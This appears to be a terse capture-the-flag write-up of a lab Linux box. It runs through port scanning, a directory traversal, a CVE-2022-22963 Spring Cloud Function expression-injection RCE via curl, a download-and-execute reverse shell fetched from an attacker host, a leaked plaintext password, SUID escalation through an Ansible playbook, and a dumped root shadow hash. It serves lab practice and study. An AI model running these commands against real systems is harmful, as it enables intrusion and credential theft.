I will re writeup soon

IP: 10.10.11.204

nmap 

rustscan -u 5000 -a 10.10.11.204 -- -sC -sV -A -oN nmap.txt

```PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2<SNIP>Db8=
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLX<SNIP>VPc/yY3Km7Sg1GzTyoGUxvy+EIsg=
|   256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICZzUvDL0INOklR7AH+iFw+uX+nkJtcw7V+1AsMO9P7p
8080/tcp open  nagios-nsca syn-ack Nagios NSCA
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne
```

sudo nmap -T5 --top-ports 1000 -sU --open 10.10.11.204. No port UDP open

TCP 8080

![image](https://user-images.githubusercontent.com/84217196/224526330-1c54ef36-3745-437b-b389-bee319227ca7.png)


the page have serveral function, but only upload file is working. The file type is image. after upload we se it's vuln LFI or Directory traversal

![image](https://user-images.githubusercontent.com/84217196/224526338-d6fa1f89-b07e-4a3c-a6bf-7bdd13f6503e.png)


http://10.10.11.204:8080/show_image?img=simple-2.png

![image](https://user-images.githubusercontent.com/84217196/224526346-574a6bbd-83b2-49a1-9242-dbb7b64a5614.png)


Enumeration

we know user frank, phil

curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v

CVE-2022-22963: Remote code execution in Spring Cloud Function by malicious Spring Expression
me2nuk/CVE-2022-22963: Spring Cloud Function Vulnerable Application / CVE-2022-22963 (github.com)

multi/http/spring_cloud_function_spel_injection

It's work, so we have RCE. can upload payload revershell via wget/curl then execute it via bash.

User

curl http://10.10.14.17:8001/payload.sh -o /tmp/payload.sh 
bash /tmp/payload.sh


![image](https://user-images.githubusercontent.com/84217196/224526357-5f530535-18fd-4202-a2b1-8792e9888240.png)

![image](https://user-images.githubusercontent.com/84217196/224526363-9945fc4f-6ed9-4678-96d3-71755c0b6ef7.png)




DocPhillovestoInject123

![image](https://user-images.githubusercontent.com/84217196/224526367-b0247cd5-f54e-4656-a4eb-6335caa32d39.png)


ansible playbook | GTFOBins

pe.yml
```
- hosts: localhost
  tasks:
    - name: PE
      ansible.builtin.shell: |
        chmod +s /bin/bash
      become: true
```

![image](https://user-images.githubusercontent.com/84217196/224526373-e0b787c8-fa9e-4304-b902-703523161cd6.png)



Ansible Playbook Weaponization – Cyber Security Architect | Red/Blue Teaming | Exploit/Malware Analysis (rioasmara.com)

cat /etc/shadow

root:$6$KeHoGfvAPeHOqplu$tC/4gh419crGM6.btFzCazMPFH0gaX.x/Qp.PJZCoizg4wYcl48wtOGA3lwxNjooq9MDzJZJvzav7V37p9aMT1:19381:0:99999:7:::

![image](https://user-images.githubusercontent.com/84217196/224526321-aa192aee-9b94-4a0b-8284-a500f7366857.png)
